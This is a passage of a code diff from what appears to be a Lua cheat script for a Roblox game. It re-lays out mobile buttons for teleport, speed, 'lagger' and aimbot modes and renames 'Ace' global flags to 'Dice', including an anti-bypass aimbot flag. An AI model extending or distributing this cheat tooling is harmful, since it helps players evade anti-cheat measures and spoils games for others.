 if mobileButtons.autoLeft then mobileButtons.autoLeft.setActive(autoLeftEnabled == true) end
 end)
 end)
-makeButton("tp", "TP\nDOWN", defaults.tp, function(btn)
+makeButton("tp", "TP\nDOWN", 1, 2, 2, function(btn)
 if runTPFloor then runTPFloor() end
 pulse(btn)
 end)
-makeButton("carry", "CARRY\nSPD", defaults.carry, function(btn)
+makeButton("carry", "CARRY\nSPD", 2, 2, 4, function(btn)
 if setSpeedMode then setSpeedMode(currentSpeedMode == "Carry" and "Normal" or "Carry") end
 task.delay(0.03, function()
 if mobileButtons.carry then mobileButtons.carry.setActive(currentSpeedMode == "Carry") end
@@ -7884,7 +8857,7 @@ if mobileButtons.laggerNormal then mobileButtons.laggerNormal.setActive(currentS
 if mobileButtons.laggerCarry then mobileButtons.laggerCarry.setActive(currentSpeedMode == "Lagger Carry") end
 end)
 end)
-makeButton("laggerNormal", "LAGGER\nMODE", defaults.laggerNormal, function(btn)
+makeButton("laggerNormal", "LAGGER\nMODE", 1, 3, 4, function(btn)
 if setSpeedMode then setSpeedMode(currentSpeedMode == "Lagger" and "Normal" or "Lagger") end
 task.delay(0.03, function()
 if mobileButtons.carry then mobileButtons.carry.setActive(currentSpeedMode == "Carry") end
@@ -7892,7 +8865,7 @@ if mobileButtons.laggerNormal then mobileButtons.laggerNormal.setActive(currentS
 if mobileButtons.laggerCarry then mobileButtons.laggerCarry.setActive(currentSpeedMode == "Lagger Carry") end
 end)
 end)
-makeButton("laggerCarry", "LAGGER\nCARRY", defaults.laggerCarry, function(btn)
+makeButton("laggerCarry", "LAGGER\nCARRY", 2, 3, 4, function(btn)
 if setSpeedMode then setSpeedMode(currentSpeedMode == "Lagger Carry" and "Normal" or "Lagger Carry") end
 task.delay(0.03, function()
 if mobileButtons.carry then mobileButtons.carry.setActive(currentSpeedMode == "Carry") end
@@ -7900,13 +8873,13 @@ if mobileButtons.laggerNormal then mobileButtons.laggerNormal.setActive(currentS
 if mobileButtons.laggerCarry then mobileButtons.laggerCarry.setActive(currentSpeedMode == "Lagger Carry") end
 end)
 end)
-_G.AceApplyMobileButtonSize()
-_G.AceApplyMobileButtonsHidden()
+_G.DiceApplyMobileButtonSize()
+_G.DiceApplyMobileButtonsHidden()
 RunService.Heartbeat:Connect(function()
 if mobileButtons.autoLeft then mobileButtons.autoLeft.setActive(autoLeftEnabled == true) end
 if mobileButtons.autoRight then mobileButtons.autoRight.setActive(autoRightEnabled == true) end
-if mobileButtons.aimbot then mobileButtons.aimbot.setActive((_G.AceNormalAimbotOn == true) or (_G.AceAntiBypassAimbotOn == true)) end
-if mobileButtons.antiDesync then mobileButtons.antiDesync.setActive(_G.AceAntiDesyncAimbotOn == true) end
+if mobileButtons.aimbot then mobileButtons.aimbot.setActive((_G.DiceNormalAimbotOn == true) or (_G.DiceAntiBypassAimbotOn == true)) end
+if mobileButtons.antiDesync then mobileButtons.antiDesync.setActive(_G.DiceAntiDesyncAimbotOn == true) end
 if mobileButtons.carry then mobileButtons.carry.setActive(currentSpeedMode == "Carry") end
 if mobileButtons.laggerNormal then mobileButtons.laggerNormal.setActive(currentSpeedMode == "Lagger") end
 if mobileButtons.laggerCarry then mobileButtons.laggerCarry.setActive(currentSpeedMode == "Lagger Carry") end
